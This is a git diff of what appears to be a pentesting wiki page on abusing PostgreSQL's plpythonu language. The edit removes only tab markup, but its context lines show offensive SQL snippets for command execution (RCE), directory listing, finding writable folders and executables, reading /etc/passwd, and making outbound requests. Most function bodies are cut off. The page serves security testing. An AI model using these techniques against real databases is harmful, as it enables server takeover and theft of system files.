@@ -52,9 +52,6 @@ Note that it's possible to compile the secure versions as "unsecure". Check [**t
 
 ## plpythonu/plpython3u
 
-{{#tabs}}
-{{#tab name="RCE"}}
-
 ```sql
 CREATE OR REPLACE FUNCTION exec (cmd text)
 RETURNS VARCHAR(65535) stable
@@ -68,10 +65,6 @@ LANGUAGE 'plpythonu';
 SELECT cmd("ls"); #RCE with popen or execve
 ```
 
-{{#endtab}}
-
-{{#tab name="Get OS user"}}
-
 ```sql
 CREATE OR REPLACE FUNCTION get_user (pkg text)
 RETURNS VARCHAR(65535) stable
@@ -83,10 +76,6 @@ LANGUAGE 'plpythonu';
 
 SELECT get_user(""); #Get user, para is useless
 ```
-
-{{#endtab}}
-
-{{#tab name="List dir"}}
 
 ```sql
 CREATE OR REPLACE FUNCTION lsdir (dir text)
@@ -101,10 +90,6 @@ LANGUAGE 'plpythonu';
 
 SELECT lsdir("/"); #List dir
 ```
-
-{{#endtab}}
-
-{{#tab name="Find W folder"}}
 
 ```sql
 CREATE OR REPLACE FUNCTION findw (dir text)
@@ -133,9 +118,6 @@ LANGUAGE 'plpythonu';
 SELECT findw("/"); #Find Writable folders from a folder (recursively)
 ```
 
-{{#endtab}}
-
-{{#tab name="Find File"}}
 
 ```sql
 CREATE OR REPLACE FUNCTION find_file (exe_sea text)
@@ -170,10 +152,6 @@ LANGUAGE 'plpythonu';
 SELECT find_file("psql"); #Find a file
 ```
 
-{{#endtab}}
-
-{{#tab name="Find executables"}}
-
 ```sql
 CREATE OR REPLACE FUNCTION findx (dir text)
 RETURNS VARCHAR(65535) stable
@@ -205,10 +183,6 @@ LANGUAGE 'plpythonu';
 
 SELECT findx("/"); #Find an executables in folder (recursively)
 ```
-
-{{#endtab}}
-
-{{#tab name="Find exec by subs"}}
 
 ```sql
 CREATE OR REPLACE FUNCTION find_exe (exe_sea text)
@@ -243,10 +217,6 @@ LANGUAGE 'plpythonu';
 SELECT find_exe("psql"); #Find executable by susbstring
 ```
 
-{{#endtab}}
-
-{{#tab name="Read"}}
-
 ```sql
 CREATE OR REPLACE FUNCTION read (path text)
 RETURNS VARCHAR(65535) stable
@@ -261,10 +231,6 @@ LANGUAGE 'plpythonu';
 select read('/etc/passwd'); #Read a file in b64
 ```
 
-{{#endtab}}
-
-{{#tab name="Get perms"}}
-
 ```sql
 CREATE OR REPLACE FUNCTION get_perms (path text)
 RETURNS VARCHAR(65535) stable
@@ -278,10 +244,6 @@ LANGUAGE 'plpythonu';
 
 select get_perms("/etc/passwd"); # Get perms of file
 ```
-
-{{#endtab}}
-
-{{#tab name="Request"}}
 
 ```sql
 CREATE OR REPLACE FUNCTION req2 (url text)
